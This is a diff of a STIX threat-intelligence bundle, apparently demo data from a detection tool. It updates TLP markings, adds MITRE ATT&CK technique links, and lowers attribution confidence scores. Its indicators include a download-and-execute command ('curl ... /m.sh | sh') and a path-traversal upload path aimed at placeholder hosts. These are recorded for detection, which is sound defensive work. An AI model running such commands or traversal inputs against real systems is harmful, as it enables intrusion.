@@ -1,5 +1,5 @@
 {
-  "id": "bundle--189c5755-f248-55e0-9020-5988495fb1b9",
+  "id": "bundle--8da8ebbc-a5af-5308-9497-e26481618715",
   "objects": [
     {
       "created": "2026-01-01T00:00:00.000Z",
@@ -12,22 +12,34 @@
       "type": "identity"
     },
     {
+      "created": "2026-01-01T00:00:00.000Z",
+      "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
+      "definition": {
+        "statement": "© 2026 The MITRE Corporation. This work is reproduced and distributed with the permission of The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation. The MITRE Corporation (MITRE) hereby grants you a non-exclusive, royalty-free license to use ATT&CK for research, development, and commercial purposes. Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy."
+      },
+      "definition_type": "statement",
+      "id": "marking-definition--7315731d-00d8-5917-a587-5bb942375d69",
+      "name": "MITRE ATT&CK v20.0 notice",
+      "spec_version": "2.1",
+      "type": "marking-definition"
+    },
+    {
       "created": "2022-10-01T00:00:00.000Z",
       "extensions": {
         "extension-definition--60a3c5c5-0d10-413e-aab3-9e08dde9e88d": {
           "extension_type": "property-extension",
-          "tlp_2_0": "amber"
+          "tlp_2_0": "amber+strict"
         }
       },
-      "id": "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421",
-      "name": "TLP:AMBER",
+      "id": "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003",
+      "name": "TLP:AMBER+STRICT",
       "spec_version": "2.1",
       "type": "marking-definition"
     },
     {
       "id": "domain-name--a2abee7b-b5a5-5192-a9e8-887ed9a8f818",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "spec_version": "2.1",
       "type": "domain-name",
@@ -36,7 +48,7 @@
     {
       "id": "domain-name--ca4cb591-5831-5b48-b62b-8a84cb57099f",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "spec_version": "2.1",
       "type": "domain-name",
@@ -45,7 +57,7 @@
     {
       "id": "ipv4-addr--026e0e4f-c445-5c9c-8765-af0c38b3b4c8",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "spec_version": "2.1",
       "type": "ipv4-addr",
@@ -54,7 +66,7 @@
     {
       "id": "ipv4-addr--13295f6b-b0da-5c21-9761-b9136ac86fe6",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "spec_version": "2.1",
       "type": "ipv4-addr",
@@ -63,7 +75,7 @@
     {
       "id": "url--4c1cb668-9ea1-5e6d-ad35-f51b8123d158",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "spec_version": "2.1",
       "type": "url",
@@ -84,7 +96,7 @@
       "modified": "2026-10-18T01:02:05.100Z",
       "name": "domain: stage2[.]example[.]invalid",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[domain-name:value = 'stage2.example.invalid']",
       "pattern_type": "stix",
@@ -117,7 +129,7 @@
       "modified": "2026-10-18T01:02:04.004Z",
       "name": "payload_sha256: fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[artifact:hashes.'SHA-256' = 'fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9']",
       "pattern_type": "stix",
@@ -149,7 +161,7 @@
       "modified": "2026-10-18T01:02:04.009Z",
       "name": "ip: 203[.]0[.]113[.]50",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[ipv4-addr:value = '203.0.113.50']",
       "pattern_type": "stix",
@@ -181,7 +193,7 @@
       "modified": "2026-10-18T01:02:05.100Z",
       "name": "url: hxxp://stage2[.]example[.]invalid/m.sh",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[url:value = 'http://stage2.example.invalid/m.sh']",
       "pattern_type": "stix",
@@ -213,7 +225,7 @@
       "modified": "2026-10-18T01:02:04.000Z",
       "name": "payload_sha256: 2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[artifact:hashes.'SHA-256' = '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae']",
       "pattern_type": "stix",
@@ -245,7 +257,7 @@
       "modified": "2026-10-18T01:02:04.009Z",
       "name": "cmdline: sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh'",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[process:command_line = 'sh -c \\'curl -s http://stage2.example.invalid/m.sh | sh\\'']",
       "pattern_type": "stix",
@@ -277,7 +289,7 @@
       "modified": "2026-10-18T01:02:04.004Z",
       "name": "http_path: /api/upload?path=../../../dev/shm/.m&token=REDACTED",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[network-traffic:extensions.'http-request-ext'.request_value = '/api/upload?path=../../../dev/shm/.m&token=REDACTED']",
       "pattern_type": "stix",
@@ -309,7 +321,7 @@
       "modified": "2026-10-18T01:02:10.000Z",
       "name": "behaviour_fingerprint: bf2:07d7fffe3024f68dcedc50ae3405fd39",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "bf2:07d7fffe3024f68dcedc50ae3405fd39",
       "pattern_type": "foiled-bf",
@@ -354,7 +366,7 @@
       "modified": "2026-10-18T01:02:04.000Z",
       "name": "http_ua: demo-loader/0.1 (REDACTED@example.invalid)",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[network-traffic:extensions.'http-request-ext'.request_header.'User-Agent' = 'demo-loader/0.1 (REDACTED@example.invalid)']",
       "pattern_type": "stix",
@@ -386,7 +398,7 @@
       "modified": "2026-10-18T01:02:10.000Z",
       "name": "domain: k7f3q9[.]cb[.]example[.]invalid",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[domain-name:value = 'k7f3q9.cb.example.invalid']",
       "pattern_type": "stix",
@@ -418,7 +430,7 @@
       "modified": "2026-10-18T01:02:03.000Z",
       "name": "http_path: /admin",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[network-traffic:extensions.'http-request-ext'.request_value = '/admin']",
       "pattern_type": "stix",
@@ -450,7 +462,7 @@
       "modified": "2026-10-18T01:02:05.100Z",
       "name": "ip: 192[.]0[.]2[.]80",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "pattern": "[ipv4-addr:value = '192.0.2.80']",
       "pattern_type": "stix",
@@ -470,6 +482,93 @@
     {
       "created": "2026-01-01T00:00:00.000Z",
       "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
+      "description": "Foiled's reference to MITRE ATT&CK T1059.004 (Unix Shell), ATT&CK v20.0. MITRE's own object is named in external_references and x_foiled_mitre_stix_id.",
+      "external_references": [
+        {
+          "external_id": "T1059.004",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/versions/v20/techniques/T1059/004/"
+        }
+      ],
+      "id": "attack-pattern--6d809884-1713-5738-89c5-ac961d04dea5",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "execution"
+        }
+      ],
+      "modified": "2026-01-01T00:00:00.000Z",
+      "name": "Unix Shell",
+      "object_marking_refs": [
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003",
+        "marking-definition--7315731d-00d8-5917-a587-5bb942375d69"
+      ],
+      "spec_version": "2.1",
+      "type": "attack-pattern",
+      "x_foiled_attack_version": "20.0",
+      "x_foiled_mitre_stix_id": "attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56"
+    },
+    {
+      "created": "2026-01-01T00:00:00.000Z",
+      "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
+      "description": "Foiled's reference to MITRE ATT&CK T1105 (Ingress Tool Transfer), ATT&CK v20.0. MITRE's own object is named in external_references and x_foiled_mitre_stix_id.",
+      "external_references": [
+        {
+          "external_id": "T1105",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/versions/v20/techniques/T1105/"
+        }
+      ],
+      "id": "attack-pattern--8a3bf4ee-426f-58bb-9937-d0c6cdb9c55c",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "command-and-control"
+        }
+      ],
+      "modified": "2026-01-01T00:00:00.000Z",
+      "name": "Ingress Tool Transfer",
+      "object_marking_refs": [
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003",
+        "marking-definition--7315731d-00d8-5917-a587-5bb942375d69"
+      ],
+      "spec_version": "2.1",
+      "type": "attack-pattern",
+      "x_foiled_attack_version": "20.0",
+      "x_foiled_mitre_stix_id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add"
+    },
+    {
+      "created": "2026-01-01T00:00:00.000Z",
+      "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
+      "description": "Foiled's reference to MITRE ATT&CK T1190 (Exploit Public-Facing Application), ATT&CK v20.0. MITRE's own object is named in external_references and x_foiled_mitre_stix_id.",
+      "external_references": [
+        {
+          "external_id": "T1190",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/versions/v20/techniques/T1190/"
+        }
+      ],
+      "id": "attack-pattern--ee27eeb8-aadb-5e73-8dcd-3ef3ab1d8fb0",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "initial-access"
+        }
+      ],
+      "modified": "2026-01-01T00:00:00.000Z",
+      "name": "Exploit Public-Facing Application",
+      "object_marking_refs": [
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003",
+        "marking-definition--7315731d-00d8-5917-a587-5bb942375d69"
+      ],
+      "spec_version": "2.1",
+      "type": "attack-pattern",
+      "x_foiled_attack_version": "20.0",
+      "x_foiled_mitre_stix_id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c"
+    },
+    {
+      "created": "2026-01-01T00:00:00.000Z",
+      "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
       "external_references": [
         {
           "external_id": "FOILED-DEMO-0001",
@@ -480,7 +579,7 @@
       "modified": "2026-01-01T00:00:00.000Z",
       "name": "FOILED-DEMO-0001",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "spec_version": "2.1",
       "type": "vulnerability"
@@ -489,11 +588,11 @@
       "created": "2026-01-01T00:00:00.000Z",
       "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
       "description": "A Foiled campaign: attempts clustered on shared indicators and behaviour (#33).",
-      "id": "campaign--80c3ba00-8dff-510b-9081-26c850e91cd2",
+      "id": "campaign--8576d9bc-5f4f-5cb4-b22c-b40c98f77545",
       "modified": "2026-01-01T00:00:00.000Z",
-      "name": "cmp_demo",
+      "name": "cmp_000000000000000000000001",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "spec_version": "2.1",
       "type": "campaign"
@@ -506,7 +605,7 @@
       "modified": "2026-01-01T00:00:00.000Z",
       "name": "Example Group",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "spec_version": "2.1",
       "type": "intrusion-set"
@@ -520,7 +619,7 @@
       "modified": "2026-10-18T01:02:10.000Z",
       "number_observed": 7,
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "object_refs": [
         "domain-name--a2abee7b-b5a5-5192-a9e8-887ed9a8f818",
@@ -546,7 +645,7 @@
       "id": "note--c898cea9-136d-5805-b55d-0f41595ce45d",
       "modified": "2026-10-18T01:02:10.000Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "object_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -555,17 +654,54 @@
       "type": "note"
     },
     {
-      "confidence": 100,
+      "confidence": 24,
       "created": "2026-10-18T01:02:03.000Z",
       "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
-      "description": "Possible association with Example Group. This is not an attribution. Confidence 100 of 100 (high).",
-      "id": "relationship--20bbf17a-46c4-55d2-a6d1-03c90bb93674",
+      "description": "We assess as ATT&CK T1059.004 (Unix Shell). Confidence 24 of 100 (low).",
+      "id": "relationship--02353814-6eed-52bc-ae6d-cbc254bb9aea",
       "labels": [
-        "foiled-band:high"
+        "foiled-band:low"
       ],
       "modified": "2026-10-18T01:02:10.000Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
+      ],
+      "relationship_type": "related-to",
+      "source_ref": "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9",
+      "spec_version": "2.1",
+      "target_ref": "attack-pattern--6d809884-1713-5738-89c5-ac961d04dea5",
+      "type": "relationship",
+      "x_foiled_attack_version": "20.0",
+      "x_foiled_caps_applied": [
+        "noise penalty limited so it cannot cancel a hook or signature"
+      ],
+      "x_foiled_confirmed": false,
+      "x_foiled_evidence": [
+        {
+          "points": 24,
+          "source": "rule"
+        },
+        {
+          "points": 0,
+          "source": "noise_score"
+        }
+      ],
+      "x_foiled_link_kind": "attempt_technique",
+      "x_foiled_publishable": false,
+      "x_foiled_wording": "we assess as"
+    },
+    {
+      "confidence": 22,
+      "created": "2026-10-18T01:02:03.000Z",
+      "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
+      "description": "Possible association with Example Group. This is not an attribution. Confidence 22 of 100 (low).",
+      "id": "relationship--20bbf17a-46c4-55d2-a6d1-03c90bb93674",
+      "labels": [
+        "foiled-band:low"
+      ],
+      "modified": "2026-10-18T01:02:10.000Z",
+      "object_marking_refs": [
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "relationship_type": "related-to",
       "source_ref": "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9",
@@ -575,49 +711,86 @@
       "x_foiled_confirmed": false,
       "x_foiled_evidence": [
         {
-          "points": 60,
-          "source": "vuln_path_hook"
+          "points": 6,
+          "source": "enrichment"
         },
         {
-          "points": 45,
-          "source": "campaign_cluster"
+          "points": 16,
+          "source": "llm"
         }
       ],
       "x_foiled_link_kind": "attempt_actor",
-      "x_foiled_publishable": true,
+      "x_foiled_publishable": false,
       "x_foiled_wording": "possible association"
     },
     {
-      "confidence": 100,
+      "confidence": 22,
       "created": "2026-10-18T01:02:03.000Z",
       "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
-      "description": "Possible part of campaign cmp_demo. Confidence 100 of 100 (high).",
-      "id": "relationship--9ebd9539-d88e-5895-8b97-b0bb93042290",
+      "description": "We assess as ATT&CK T1105 (Ingress Tool Transfer). Confidence 22 of 100 (low).",
+      "id": "relationship--2f51614d-ebdc-5ed7-b2c9-d81b78eaa10f",
       "labels": [
-        "foiled-band:high"
+        "foiled-band:low"
       ],
       "modified": "2026-10-18T01:02:10.000Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "relationship_type": "related-to",
       "source_ref": "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9",
       "spec_version": "2.1",
-      "target_ref": "campaign--80c3ba00-8dff-510b-9081-26c850e91cd2",
+      "target_ref": "attack-pattern--8a3bf4ee-426f-58bb-9937-d0c6cdb9c55c",
+      "type": "relationship",
+      "x_foiled_attack_version": "20.0",
+      "x_foiled_caps_applied": [
+        "noise penalty limited so it cannot cancel a hook or signature"
+      ],
+      "x_foiled_confirmed": false,
+      "x_foiled_evidence": [
+        {
+          "points": 22,
+          "source": "rule"
+        },
+        {
+          "points": 0,
+          "source": "noise_score"
+        }
+      ],
+      "x_foiled_link_kind": "attempt_technique",
+      "x_foiled_publishable": false,
+      "x_foiled_wording": "we assess as"
+    },
+    {
+      "confidence": 34,
+      "created": "2026-10-18T01:02:03.000Z",
+      "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
+      "description": "Possible part of campaign cmp_000000000000000000000001. Confidence 34 of 100 (low).",
+      "id": "relationship--ae423162-eca5-5df3-8780-a8565369fa27",
+      "labels": [
+        "foiled-band:low"
+      ],
+      "modified": "2026-10-18T01:02:10.000Z",
+      "object_marking_refs": [
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
+      ],
+      "relationship_type": "related-to",
+      "source_ref": "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9",
+      "spec_version": "2.1",
+      "target_ref": "campaign--8576d9bc-5f4f-5cb4-b22c-b40c98f77545",
       "type": "relationship",
       "x_foiled_confirmed": false,
       "x_foiled_evidence": [
         {
-          "points": 60,
-          "source": "vuln_path_hook"
+          "points": 36,
+          "source": "campaign_cluster"
         },
         {
-          "points": 45,
-          "source": "campaign_cluster"
+          "points": -2,
+          "source": "noise_score"
         }
       ],
       "x_foiled_link_kind": "attempt_campaign",
-      "x_foiled_publishable": true,
+      "x_foiled_publishable": false,
       "x_foiled_wording": "possible"
     },
     {
@@ -631,7 +804,7 @@
       ],
       "modified": "2026-10-18T01:02:10.000Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "relationship_type": "related-to",
       "source_ref": "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9",
@@ -669,6 +842,44 @@
       "x_foiled_wording": "we assess as"
     },
     {
+      "confidence": 38,
+      "created": "2026-10-18T01:02:03.000Z",
+      "created_by_ref": "identity--19c7fb46-6286-5366-9cc6-1f5df4d464cc",
+      "description": "We assess as ATT&CK T1190 (Exploit Public-Facing Application). Confidence 38 of 100 (low).",
+      "id": "relationship--d61aed68-1d73-5418-bf2b-83d23abe4956",
+      "labels": [
+        "foiled-band:low"
+      ],
+      "modified": "2026-10-18T01:02:10.000Z",
+      "object_marking_refs": [
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
+      ],
+      "relationship_type": "related-to",
+      "source_ref": "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9",
+      "spec_version": "2.1",
+      "target_ref": "attack-pattern--ee27eeb8-aadb-5e73-8dcd-3ef3ab1d8fb0",
+      "type": "relationship",
+      "x_foiled_attack_version": "20.0",
+      "x_foiled_confirmed": false,
+      "x_foiled_evidence": [
+        {
+          "points": 30,
+          "source": "rule"
+        },
+        {
+          "points": 10,
+          "source": "catalogue_prior"
+        },
+        {
+          "points": -2,
+          "source": "noise_score"
+        }
+      ],
+      "x_foiled_link_kind": "attempt_technique",
+      "x_foiled_publishable": false,
+      "x_foiled_wording": "we assess as"
+    },
+    {
       "confidence": 98,
       "count": 2,
       "created": "2026-10-18T01:02:03.000Z",
@@ -678,7 +889,7 @@
       "last_seen": "2026-10-18T01:02:04.000Z",
       "modified": "2026-10-18T01:02:04.000Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -700,7 +911,7 @@
       "last_seen": "2026-10-18T01:02:05.100Z",
       "modified": "2026-10-18T01:02:05.100Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -722,7 +933,7 @@
       "last_seen": "2026-10-18T01:02:04.000Z",
       "modified": "2026-10-18T01:02:04.000Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -744,7 +955,7 @@
       "last_seen": "2026-10-18T01:02:04.004Z",
       "modified": "2026-10-18T01:02:04.004Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -766,7 +977,7 @@
       "last_seen": "2026-10-18T01:02:05.100Z",
       "modified": "2026-10-18T01:02:05.100Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -788,7 +999,7 @@
       "last_seen": "2026-10-18T01:02:10.000Z",
       "modified": "2026-10-18T01:02:10.000Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -810,7 +1021,7 @@
       "last_seen": "2026-10-18T01:02:03.000Z",
       "modified": "2026-10-18T01:02:03.000Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -832,7 +1043,7 @@
       "last_seen": "2026-10-18T01:02:04.009Z",
       "modified": "2026-10-18T01:02:04.009Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -854,7 +1065,7 @@
       "last_seen": "2026-10-18T01:02:05.100Z",
       "modified": "2026-10-18T01:02:05.100Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -876,7 +1087,7 @@
       "last_seen": "2026-10-18T01:02:04.009Z",
       "modified": "2026-10-18T01:02:04.009Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -898,7 +1109,7 @@
       "last_seen": "2026-10-18T01:02:04.004Z",
       "modified": "2026-10-18T01:02:04.004Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
@@ -920,7 +1131,7 @@
       "last_seen": "2026-10-18T01:02:10.000Z",
       "modified": "2026-10-18T01:02:10.000Z",
       "object_marking_refs": [
-        "marking-definition--55d920b0-5e8b-4f79-9ee9-91f868d9b421"
+        "marking-definition--939a9414-2ddd-4d32-a0cd-375ea402b003"
       ],
       "observed_data_refs": [
         "observed-data--947e042c-4d32-585b-a946-8a1d79089fc9"
